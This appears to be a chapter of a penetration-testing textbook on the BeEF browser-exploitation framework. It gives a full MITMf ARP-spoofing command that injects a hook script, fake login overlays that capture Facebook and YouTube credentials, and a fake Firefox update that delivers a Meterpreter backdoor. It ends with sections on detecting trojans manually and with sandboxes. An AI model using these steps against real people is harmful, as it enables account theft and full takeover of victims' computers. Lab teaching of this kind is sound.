<html><head></head><body>
        <section>

                            <header>
                    <h1 class="header-title">Attack and Detect Trojans with BeEF</h1>
                </header>
            
            <article>
                
<p><span>In this chapter, we will learn about the BeEF tool and how to hook it using a <strong>man-in-the-middle framework</strong> (<strong>MITMf</strong>). We'll then learn how to steal a username and password by redirecting the user to a dummy website where we will capture all their credentials. Then, we will gain access to the Meterpreter section using BeEF. Lastly, we will learn how to detect Trojans both manually and with a sandbox.</span></p>
<p>In this chapter, we will cover the following topics:</p>
<ul>
<li>The BeEF tool</li>
<li>BeEF – hook using a MITMf</li>
<li>BeEF – basic commands </li>
<li>BeEF – Pretty Theft</li>
<li>BeEF – Meterpreter 1</li>
<li>Detecting Trojans manually </li>
<li>Detecting Trojans using a sandbox</li>
</ul>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">The BeEF tool</h1>
                </header>
            
            <article>
                
<p>In this and the coming sections, we're going to have a look at a tool called BeEF. The <strong>Browser Exploitation Framework</strong> (<strong>BeEF</strong>) allows us to run a number of commands and attacks on a hooked target. A hooked target is basically a target that executes an URL or a JavaScript code given to us by BeEF. Once the target is hooked, we'll be able to run all the commands that BeEF allows us to.</p>
<p>The first thing we're going to have a look at is the main interface of BeEF, how to run it, and a very simple way to hook a target to BeEF. To run BeEF, we just have to click on the BeEF icon on the desktop. It'll automatically run the <kbd>http://127.0.0.1:3000/ui/panel</kbd> URL, which contains the browser interface or the web interface of the tool. It'll ask for a username and a password. The username is <kbd>beef</kbd> and the password is <kbd>beef</kbd> as well. Once logged in, on the left, we'll see the browsers that we have access to, in the <span class="packt_screen">Hooked Browsers</span> pane:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1640 image-border" src="assets/72880417-40f7-41a7-901c-538cf10211e1.png" style="width:106.58em;height:64.83em;"/></p>
<p>The <span class="packt_screen">Online Browsers</span> are the browsers that we currently have access to, and the <span class="packt_screen">Offline Browsers </span>are the ones that we had access to. At the moment, we can't run any commands on the browsers; we had access to these browsers before, but we can't currently do anything on them.</p>
<p>What interests us is the <span class="packt_screen">Online Browsers</span>. There are a number of methods to get browsers or targets hooked to BeEF. If we just go back to the Terminal window, we can see that it's telling us the script URL that has to be executed on the target browser so that they get hooked to BeEF:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1641 image-border" src="assets/4986caee-2df3-4712-9265-40821c0646f8.png" style="width:35.75em;height:2.33em;"/></p>
<p class="mce-root"/>
<p class="mce-root"/>
<p>If we can find or think of a way to get the preceding piece of URL to be executed on the target computer, then that target will be hooked to BeEF, and then we will be able to run all types of commands on that computer.</p>
<p>We can use methods that we've already learned, we can use DNS-spoofing to spoof any request to any page or to a page containing the hook, or we can do ARP poisoning and inject the hook URL into any page that the target browses. We can use an XSS exploit, which we'll talk about in <a href="d9f62886-a663-460f-8159-95d066337c38.xhtml" target="_blank"/><a href="d9f62886-a663-460f-8159-95d066337c38.xhtml" target="_blank">Chapter 21</a>, <em>Cross-Site Scripting Vulnerabilities</em>. Or we could create a page and social engineer our target to open that page, a hook page. We are going to create a hook page and see how a target will be hooked. The hook page that we're going to create can be used with social engineering and DNS-spoofing.</p>
<p>The page that we are going to create is very simple. We can use any page we want and place the hook URL at the end of the page. We can go on any website, copy the source of that website, and then place the hook URL under that. We are going to be doing something simpler; we are just going to put it into our <kbd>/var/www/html</kbd> directory—that's where the web server files are stored. We are going to modify our <kbd>index.html</kbd> file, we'll delete everything, and put in the hook URL that was given to us by the tool. We also need to modify the IP and put in the IP of the attacking machine. So the IP of the Kali machine and our IP is <kbd>10.0.2.15</kbd>:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1642 image-border" src="assets/236b3d25-612b-4b96-b53c-d5b63c860416.png" style="width:45.17em;height:6.50em;"/></p>
<p>Now we're good to go, and any person that browses the <kbd>index.html</kbd> page will be hooked to the BeEF browser, or to the BeEF framework. We also need to start the web server, Apache. To start it, we run the<span> </span><kbd>service apache2 start</kbd> command. Now the Apache server should be running. Again, we can use social engineering or we can use DNS-spoofing to get our target person to browse to the <kbd>index.html</kbd> page. We can upload the same page onto a remote server and get access to it, or we can think of any other way we want.</p>
<p class="mce-root"/>
<p>At the moment, we are going to just browse to it on our Windows browser, enter the <kbd>10.0.2.15</kbd> IP, and hit <em>Enter</em> <span>–</span> a blank page should open up:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1643 image-border" src="assets/c8207302-f818-438a-8504-e96dd74284e0.png" style="width:106.58em;height:23.33em;"/></p>
<p>Our page doesn't really say anything, but if we go to our BeEF browser, we will see that we have a new IP in the <span class="packt_screen">Online Browsers</span>, and if we click on that IP, we will see some basic details about the target computer:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1644 image-border" src="assets/5aa93606-00b7-4740-a792-9d5d35b8537b.png" style="width:104.83em;height:61.92em;"/></p>
<p>We can see that the target is using <span class="packt_screen">Mozilla/5.0</span> with <span class="packt_screen">Windows NT 10.0</span>, it's <span class="packt_screen">Firefox/61.0</span>. We can also see the installed <span class="packt_screen">Browser Plugins</span>. These are very useful if we want to run buffer-overflow exploits on the target computer. We can also see the <span class="packt_screen">Page URL</span> that we managed to get the hook from, and we can see the <span class="packt_screen">Cookies</span> information at the bottom, as well and details about the date and the <span class="packt_screen">Window Size</span>.</p>
<p>The <span class="packt_screen">Commands</span> tab is the one we'll use the most. The following screenshot shows a large number of commands and attacks on the target computer—we'll be dealing with this later:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1645 image-border" src="assets/cb9a06b8-5581-484a-8c82-13ff996bc061.png" style="width:12.00em;height:19.42em;"/></p>
<p>The <span class="packt_screen">Rider</span> tab will allow us to see and create HTTP requests:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1646 image-border" src="assets/a90e3a19-ad44-4340-a678-cc1380e61882.png" style="width:85.08em;height:10.67em;"/></p>
<p>The <span class="packt_screen">XssRays</span> tab will show us whether the target web page has any XSS vulnerabilities:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1647 image-border" src="assets/1ea26ed9-1c33-43aa-8541-97767f16c98f.png" style="width:37.33em;height:8.58em;"/></p>
<p>The <span class="packt_screen">Ipec</span> tab is a BeEF Command Prompt, which will allow us to run BeEF commands from the Command Prompt instead of using the interface:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1648 image-border" src="assets/7eaf3d57-62ba-4e6e-ada9-ed9fa4fa26a1.png" style="width:36.00em;height:10.42em;"/></p>
<p>The <span class="packt_screen">Network</span> tab will give us an overview of the current network:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1649 image-border" src="assets/b8c10e2b-13ef-4aa6-8607-53300966944c.png" style="width:33.50em;height:31.42em;"/></p>
<p>Once we're done with everything, we can click on the <span class="packt_screen">Logout</span> link and we will be logged out of the tool.</p>
<p class="mce-root"/>
<p>This is just a basic overview of BeEF, the main commands and the interface, and a really basic way of hooking a target. Again, we can get people to run the hook page by using social engineering, such as a URL-shortening service to make the link shorter and look nicer, or we can do DNS-spoofing and get the target person to redirect to our own web page where the BeEF framework is working.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">BeEF – hook using a MITMf</h1>
                </header>
            
            <article>
                
<p>Another method to hook targets to BeEF is to inject the JavaScript that BeEF gives us using MITMf. So, if the target and attacker are in the same network, and if we can become the man-in-the-middle (or if we manage to the become the man-in-the-middle because we had a fake access point or because we are physically connected to the target computer, regardless of the way that we became the man-in-the-middle), we can inject the hook code into the browser, into the pages (HTTP pages) that the target person browses, and they'll be hooked to BeEF without clicking on anything, and without our having to send them anything. We're going to use the exact same link in the page that we used before, which is <kbd>http://10.0.2.15:3000/hook.js</kbd>, or the script. We are going to copy it and then we'll paste it into our <kbd>--inject</kbd> plugin with MITMf. The command is going to be <kbd>mitmf</kbd>, and then we're going to use the <kbd>--inject</kbd> and <kbd>--js-url</kbd> options, and we're going to give it the URL of the hook. The command is as follows:</p>
<pre><strong>mitmf --arp --spoof --gateway 10.0.2.1 --target 10.0.2.5 -i eth0 --inject --js-url http://10.0.2.15:3000/hook.js</strong></pre>
<p>It's the same command that we always use, <kbd>mitmf</kbd>. We're doing ARP-spoofing, we're giving the gateway <kbd>10.0.2.1</kbd>, the target <kbd>10.0.2.5</kbd>, the interface <kbd>eth0</kbd>, and we're using the <kbd>--inject</kbd> plugin, and a <kbd>--js-url</kbd> option, a URL for a JavaScript, the URL where the hook is stored, in our example its placed at <kbd>http://10.0.2.15:3000/hook.js</kbd>. After launching the command, browse the web normally, or just go to the BBC website. Now, if we go back to our BeEF, we can see that we have a target, and that target is a Windows device:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1651 image-border" src="assets/8ed3c4dc-15bb-4436-b54c-182d8dc69a69.png" style="width:44.00em;height:12.67em;"/></p>
<p class="mce-root"/>
<p class="mce-root"/>
<p>The code has been automatically injected into the BBC website, so the user didn't have to visit anything or click a URL. The code will be injected into any web page they visit and they'll get hooked. The user will get hooked as soon as they go to any website. If we go to the page source, and look at the bottom, we will see that we have the hook script at the bottom of the page source—that's why it's been executed:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1652 image-border" src="assets/3cdcb119-612a-4675-bad2-6db7328829fe.png" style="width:61.42em;height:1.67em;"/></p>
<p>That's the reason why we could actually put the script under any page. If we are making fake pages, we can just copy the source of any page and put the script at the bottom. Then, it will be executed on the target page and we will be able to hook our target to the browser.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">BeEF – basic commands</h1>
                </header>
            
            <article>
                
<p>Now that we have our browser or target hooked, we can go to the <span class="packt_screen">Commands</span> tab and start executing commands on the target:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1653 image-border" src="assets/0b83d035-9ec0-433f-8910-377a5b00ded4.png" style="width:36.08em;height:23.33em;"/></p>
<p>We can use the <span class="packt_screen">Search</span> option to look for a certain command, or we can use the categories and look for commands suitable for what we want to perform on the target computer. Some of the commands are information-gathering commands, some of them are social engineering, some of them will even give us full control over the target computer. There are a lot of commands, so we won't be able to go over all of them, but we will be looking at some of the most important commands so we know how to experiment and run them.</p>
<p>If we click on the <span class="packt_screen">Browser (53)</span> option, we will see commands related to attacks that we can do inside the browser:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1654 image-border" src="assets/f2725e1d-feee-4aa2-a945-1f70b856d680.png" style="width:15.17em;height:37.25em;"/></p>
<p>We can see attacks that will allow us to get a screenshot, we can try to turn on the webcam and see whether it works, and open the webcam on the target. If we click on <span class="packt_screen">Exploits (78),</span> we will see a number of exploits that we can run:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/648e413a-46d6-419a-a183-9d4bdf97aa3c.png" style="width:26.08em;height:39.83em;"/></p>
<p class="mce-root"/>
<p>All we have to do is click on the module that we want to run and click on the <span class="packt_screen">Execute</span> button:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/8ae96233-e1b6-4932-a9cc-072a1ab754e1.png"/></p>
<p>There are some modules that need some options to be set up, and we'll have examples of them as well.</p>
<p class="mce-root"/>
<p>In the <span class="packt_screen">Social Engineering (21)</span> option, we can show fake updates, fake notification bars, and so on:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1657 image-border" src="assets/503aedb1-8290-4a79-968d-0687327b13ff.png" style="width:16.33em;height:28.83em;"/></p>
<p>Let's have an example of a very simple command. We're going to run an alert to show an alert box. So, we are just using <span class="packt_screen">Search</span> to filter, and we can see that it will just create an alert dialog, and it's going to say <kbd>BeEF Alert Dialog</kbd>:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1658 image-border" src="assets/ee010a13-79a0-4a7c-85f5-7e636d01ec7b.png" style="width:85.08em;height:54.58em;"/></p>
<p>We can modify the alert and type to anything we want, for example, change <span class="packt_screen">Alert text</span> to <kbd>test</kbd>, and then, when we hit the <span class="packt_screen">Execute</span> button, in the target browser, we will see a message saying <span class="packt_screen">test </span>has been injected into the target browser, as shown in the following screenshot:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1659 image-border" src="assets/0325e71c-5051-4b9c-8154-0de1475f7672.png" style="width:23.17em;height:10.50em;"/></p>
<p>Another interesting thing that we can do is the raw JavaScript. It will allow us to execute any JavaScript we want. So, again, we search Google for a useful JavaScript code, such as a keylogger, or we can write our own script if we know JavaScript, and whatever we write will be executed on the target. Again, we're going to pop in an alert, and it is going to return <kbd>BeEF Raw JavaScript</kbd>, and hit the <span class="packt_screen">Execute</span> button:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/9ccd227d-c633-45d8-8441-3f3b567e0b38.png"/></p>
<p>It will give us a dialog saying <span class="packt_screen">BeEF Raw JavaScript</span>, just like we got in the previous example:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/09bc8b3b-9339-496d-8d13-53bd0d6dcc18.png" style="width:21.08em;height:8.92em;"/></p>
<p class="mce-root"/>
<p>Now, let's see whether we can get a screenshot of the target computer. For this, we're going to use a plugin called Spyder Eye. So, again, click on the plugin, hit <span class="packt_screen">Execute</span>, give it a second, then we're going to click on <span class="packt_screen">command 4</span> in the <span class="packt_screen">Module Results History</span> tab:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/1950a38e-a22b-4d70-83ed-26bb9a3566ea.png"/></p>
<p>The preceding image shows us a screenshot of what the target person is looking at.</p>
<p class="mce-root"/>
<p>Another really good plugin is a <span class="packt_screen">Redirect Browser</span> plugin. It will allow us to redirect the browser to any web page we want. This could be very useful because we can use it to redirect the target person and tell them that they need to download an update, and instead of giving them an update, we give them a backdoor. We can redirect them to a fake login page for Facebook <span>–</span> we can do anything we want with the <span class="packt_screen">Redirect Browser</span> plugin. We can set the website that we want the target to be redirected to. We're going to redirect them to <a href="http://beefproject.com" target="_blank">http://beefproject.com</a> in this example, and once we hit <span class="packt_screen">Execute</span>, the target is redirected to <a href="http://beefproject.com" target="_blank">http://beefproject.com</a> or to any specific link mentioned in the <span class="packt_screen">Redirect URL</span> textbox:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/fec6c166-3b5b-4b1a-b74f-f018ba10b032.png"/></p>
<p>These are some of the basic modules that we can use. </p>
<p class="mce-root"/>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">BeEF – Pretty Theft</h1>
                </header>
            
            <article>
                
<p>Now let's have a look at a <span class="packt_screen">Social Engineering</span> plugin that will allow us to steal usernames and passwords from accounts. Basically, it will dim the screen and will tell the person that they got logged out of the session so they need to log in again to get authenticated. This will allow us to bypass HTTPS, HSTS, and all the security that's used by the target account page. For example, if we are trying to get usernames and passwords for Facebook, we will be able to bypass all the security that Facebook uses, because we are just showing a fake Facebook page, so the user will never actually make contact with Facebook. Let's click on <span class="packt_screen">Pretty Theft</span>, which will open the tab:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/e79a26ba-34a5-4082-a7cd-bffa9da64176.png"/></p>
<p>In the preceding screenshot, we can click which account we want to hijack. Let's say we're going with <span class="packt_screen">Facebook</span>. We can select what the <span class="packt_screen">Backlight</span> will be, so we're just leaving that as <span class="packt_screen">Grey</span>, and then we hit <span class="packt_screen">Execute</span>.</p>
<p>When we go to our target, we can see that they're being told that they got logged out of their session so they need to log in with their username and password:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/d21d8f4c-4cfd-4b89-a399-719676e46077.png" style="width:25.33em;height:14.75em;"/></p>
<p>Enter the username as <kbd>zaid</kbd>, then we are going to put our password as <kbd>12345</kbd>, and hit <span class="packt_screen">Log in</span>. </p>
<p><span>If we go back to the Terminal, we can see that we got our username as <span class="packt_screen">zaid</span> and the password as 12345:</span></p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1666 image-border" src="assets/40ce5c9c-9ec9-4e7a-b231-833c89b3d814.png" style="width:38.42em;height:6.42em;"/></p>
<p>We can use this to hijack a number of accounts. Let's look at another example. If we go with <span class="packt_screen">YouTube</span>, we give it an <span class="packt_screen">Execute</span>:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1667 image-border" src="assets/c3f1a269-2df6-40db-9256-e1633db84852.png" style="width:69.75em;height:14.83em;"/></p>
<p>At the target screen, we see the YouTube logo and we can try to log in. Put in a <span class="packt_screen">Username</span> and <span class="packt_screen">Password</span>, click <span class="packt_screen">Sign In</span>, and the credentials will be captured:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/34a5b5ca-5213-43ff-a0df-d44700f643df.png" style="width:26.67em;height:15.83em;"/></p>
<p>So, again, this is a really good way to gain access to accounts because, even if the user is not planning on logging into the account that we are trying to steal, we will kind of force them to enter their username and password to be logged back into their account, and then we will be able to capture the username and password.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">BeEF – Meterpreter 1</h1>
                </header>
            
            <article>
                
<p>In this section, we are going to see how we can gain full control and get a Meterpreter session from the target computer. So, again, go to the <span class="packt_screen">Commands</span> tab, and then <span class="packt_screen">Social Engineering</span>. There are a number of ways that we can get a reverse shell. Now, it all depends on how we want to perform our social-engineering attack. We're going to use a notification bar, <span class="packt_screen">Fake Notification Bar (Firefox)—</span>we're choosing Firefox because our target runs a Firefox browser:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1671 image-border" src="assets/b8d40cba-a7b1-479d-9c5a-0503c75f4386.png" style="width:85.00em;height:57.17em;"/></p>
<p>Basically, it will display a notification bar telling the user that there is a new update or a plugin that they need to install. Once they install the plugin, they'll actually install a backdoor and we will gain full access to their computer. We'll implement it by using the same backdoor that we created and have been using throughout this book.</p>
<p>We have stored the backdoor in our web server in <kbd>/var/www/html</kbd> and named it <kbd>update.exe</kbd>, but it's the same backdoor, the same reverse-HTTP Meterpreter that we used before. Provide the full address of the backdoor inside the <span class="packt_screen">Plugin URL</span> textbox, which is <kbd>http://10.0.2.15/update.exe</kbd>, change the <span class="packt_screen">Notification text</span> to <kbd>Critical update for Firefox, click here to install</kbd>, <span>as shown in the following screenshot, and hit the <span class="packt_screen">Execute</span></span> button<span>:</span></p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/77ffa2c3-1a39-4dff-8c09-1b719438ac5c.png" style="width:34.42em;height:12.92em;"/></p>
<p>At the target, we can see that they're getting a message telling them that there is a new update for Firefox:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/e1b3c0b7-5534-47e4-8f17-3b395046fdbb.png" style="width:26.00em;height:5.08em;"/></p>
<p>Once the target downloads and installs it, they'll have a backdoor downloaded onto their machine. Once they try to run this backdoor to install the update, they'll actually run a backdoor that will give us full access to their computer. Before we run the backdoor, we need to listen on the port, exactly as we did before. Open a <kbd>msfconsole</kbd> Terminal and run <kbd>show options</kbd>. Use the Metasploit multi-handler, the same way we've done throughout this book to listen on ports. Use <kbd>meterpreter/reverse/http</kbd>, we have our IP and the port. So, we are just going to run <kbd>exploit</kbd>, and we are listening for the connections now. Let's run the update we just downloaded. If we go on the target, we will see that we got full control over it using a Meterpreter session.</p>
<p class="mce-root"/>
<div class="packt_tip">Again, this is just an example of one way of gaining full control over the target computer. There are a number of ways that we can do this using BeEF, and there are many social engineering attacks that we can do to gain full access to the target computer. It's highly recommended to go over the plugins, experiment with them, and see what attacks can be performed.</div>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Detecting Trojans manually</h1>
                </header>
            
            <article>
                
<p>The Trojans we've created so far are amazing; they can bypass antivirus programs <span>–</span> they run two pieces of code, the first one runs in the background, which runs our own code and does what we want it to do, such as opening a port or connecting back to us and giving us a shell, and it runs another piece of code that the user expects. It could display an image, play an MP3, or display a PDF file. This functionality makes it very difficult to detect, so the best thing to do is to check the properties of the file and make sure that it is what it's claiming to be. In the following screenshot, we have a Packt image and we can see that it's a <kbd>.jpg</kbd>, so it looks like a picture, it has an icon, and if we run it we will get a picture, like we saw in <a href="ed4df884-d2d6-4c71-a1a4-28e4a508ed19.xhtml" target="_blank">Chapter 13</a>, <em>Client-Side Attacks - Social Engineering</em>:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1698 image-border" src="assets/00a6c225-dd59-4416-981b-c9c06177c433.png" style="width:43.67em;height:13.33em;"/></p>
<p><span>Right-click on it and go to <span class="packt_screen">Properties</span>. When we go to <span class="packt_screen">Properties</span>, we will see that this is an application, not a picture:</span></p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/5ec6ea85-f9c6-4b22-b06a-e14cc1fa7d93.png" style="width:26.33em;height:37.00em;"/></p>
<p><span>The same goes for PDFs and MP3s; it should say MP3 if it's an MP3, it should say PDF if it's a PDF, and it should say <kbd>.jpg</kbd> if it's a <kbd>jpg</kbd>. </span>But in this case, it's telling us that it's an executable. Going through the <span class="packt_screen">Details</span>, we will see that it is an application and not a picture <span>–</span> if it was a picture, it would tell us that it was a picture:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1719 image-border" src="assets/3a6373d5-4e52-4fd4-a933-6d5c13a53e25.png" style="width:22.67em;height:32.33em;"/></p>
<p>From this, we'll know that we're being tricked. We can also play with the filename and we will be able to reset it; if we rename the file to anything else, we will see that it's an <kbd>.exe</kbd> file and not a <kbd>.jpg</kbd>. If we change it to <span class="packt_screen">test</span>, we will see that the name has been changed to <span class="packt_screen">test.exe</span>:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/0c9ad277-a3af-4ed0-a918-d5e8506c67a6.png" style="width:8.50em;height:9.33em;"/></p>
<p>Now, let's assume this Trojan was combined with an executable. If we run it, we expect to get <kbd>.exe</kbd> and an application. Let's assume that it's combined with Download Accelerator Plus software, instead of being combined with a picture. This task is going to be more difficult because we are expecting an application anyway. With the picture and with the PDF, Windows will tell us that we are trying to run an executable, but if we are expecting an executable, then we are going to run it anyway, such as with DAP. It will play the executable we are looking for and the executable will send a reverse session to Kali.</p>
<p>Go to a tool called Resource Monitor, and from that tool, go to the <span class="packt_screen">Network</span> tab. There, we will be able to see all the open ports on our machine:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/23a09142-e38a-4a9d-904a-9603b39d633f.png" style="width:43.50em;height:29.75em;"/></p>
<p>We can see that we have port <span class="packt_screen">8080</span> and it's connecting to the <span class="packt_screen">10.0.2.15</span> IP address. Obviously port <span class="packt_screen">8080</span> is not very suspicious, even if it was on port <kbd>80</kbd>, it wouldn't look suspicious, and also, it's coming from a process called <span class="packt_screen">browser.exe</span>, which is not very suspicious either. The suspicious part is the remote address; it's accessing <span class="packt_screen">10.0.2.15</span> and we don't know what that is. If it was a website, putting the IP in the browser should take us to a website or to a server of that website. In most cases, if this is a hacker computer, it will not take us to a website, and then we will know that this person is an attacker.</p>
<p>To verify the attack, we can use a tool called Reverse DNS Lookup. It gives us an IP and tells us which website this IP belongs to, or which domain this IP belongs to. Let's look at an example on Facebook. Let's say we saw a suspicious-looking IP in our Resource Manager. We are actually going to get a proper IP address for Facebook by pinging:</p>
<p class="CDPAlignCenter CDPAlign"><img src="assets/707a9a06-52cd-48d7-adf7-9a3e9222cd0e.png" style="width:42.42em;height:13.42em;"/></p>
<p>We have seen the <kbd>157.240.7.38</kbd> IP; there is a connection on port <kbd>80</kbd> going to this IP. Copy this IP and use Google to search for <kbd>Reverse DNS</kbd>, open the first site, paste the IP, and click <span class="packt_screen">Reverse Lookup</span>. We can see the IP that we saw in our resources:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1724 image-border" src="assets/fa75a09a-39e7-431f-b91f-3bd730de59c3.png" style="width:43.67em;height:16.67em;"/></p>
<p>If it's for a proper website, then there is nothing to be concerned about; if it looks suspicious, then we will know that this is going to a suspicious person. Now, as we can see in the preceding screenshot, it's going to Facebook and we are browsing Facebook <span>–</span> this is normal, we are using Facebook so there's a connection between us and Facebook.</p>
<p class="mce-root"/>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Detecting Trojans using a sandbox</h1>
                </header>
            
            <article>
                
<p>Now we are going to look at another way to discover malicious files, by using a sandbox. A sandbox is basically a place where our file will be executed and analyzed. It will check whether any ports will be opened, if it's going to modify registry entries—<span>basically,</span> if it's going to do any suspicious stuff. It's not an antivirus program. Our Trojan might pass antivirus programs, our Trojan passed all antivirus programs, but the sandbox applications, or the sandbox environments, will run it in a controlled environment, see whether it does anything suspicious, and give us a report. We can Google <kbd>sandbox</kbd> online, and an example of it is a website called Hybrid Analysis (<a href="https://www.hybrid-analysis.com/" target="_blank">https://www.hybrid-analysis.com/</a>).</p>
<p>Using the website is very simple: just go to the URL, select a file, and upload it. We can see the report in the following screenshot; analyzing the file and generating the report might take some time:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1786 image-border" src="assets/201ab1fd-89ad-4ea8-a628-1f903b081cb7.png" style="width:86.92em;height:52.25em;"/></p>
<p>Once we get the report, we will see some basic information; we will see that <span class="packt_screen">Malicious Indicators</span> have been found. They're hiding it from us and we have to use the full version to see them, but we don't really need to see them; if we read the whole report, we will know that this file is malicious and it's going to do something bad on our computer.</p>
<p class="mce-root"/>
<p>We can see that the file suppresses error boxes, so it doesn't display error boxes:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1787 image-border" src="assets/f8b57bbe-d9e8-493d-a72f-5a8a79769e56.png" style="width:30.17em;height:12.42em;"/></p>
<p>It also modifies the registry, and we can see the registry parameters in the following screenshot:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1788 image-border" src="assets/052e286c-a5ef-49ed-8a31-2bacc078404a.png" style="width:65.67em;height:17.75em;"/></p>
<p>We can see, in the preceding screenshot, that it's playing with the <span class="packt_screen">Internet Settings</span> and with the <span class="packt_screen">Connections</span>. We can also see that it's using the Windows Sockets service, that is, <span class="packt_screen">WinSock2</span>, so it's trying to create connections. We can also see that it's playing with the address of the process:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1789 image-border" src="assets/4117d295-21af-45ef-8291-a243609d8eb5.png" style="width:68.42em;height:12.50em;"/></p>
<p class="mce-root"/>
<p>If we scroll down, we will see one of the most important indicators. There will be more information in the following screenshot on <span class="packt_screen">Network Analysis</span>. It tries to connect to <span class="packt_screen">Host Address</span> on <span class="packt_screen">Host Port</span> <kbd>8080</kbd>:</p>
<p class="CDPAlignCenter CDPAlign"><img class="aligncenter size-full wp-image-1790 image-border" src="assets/a630b741-dd20-465e-b628-4b8dfba4904a.png" style="width:65.67em;height:15.08em;"/></p>
<p>We can go on the <kbd>10.20.14.203</kbd> IP and do a reverse DNS lookup to check whether the IP is related to a website. Also, when we upload the payload, it's never going to be executed on our computer, it's going to be executed on their server in a sandbox environment. Now, obviously, for the method we have seen, we should always use it in a VirtualBox when we are executing it on Windows. Always perform it on a virtual machine; don't perform it on our main machine. Or we can upload it into a sandbox environment, it'll be analyzed for us, and then we can read the report.</p>


            </article>

            
        </section>
    

        <section>

                            <header>
                    <h1 class="header-title">Summary</h1>
                </header>
            
            <article>
                
<p><span>In this chapter, we studied a tool called BeEF and hooked it using MITMf. Then, by redirecting the user, we captured their credentials by saying they had been logged out and asked them to re-enter their username and password. Finally, we gained access to the Meterpreter session and also learned how we can detect Trojans both manually and by using a sandbox. <br/>
In the next chapter, we are going to look at performing attacks on an external network. </span></p>
<p> </p>
<p><span> </span></p>


            </article>

            
        </section>
    </body></html>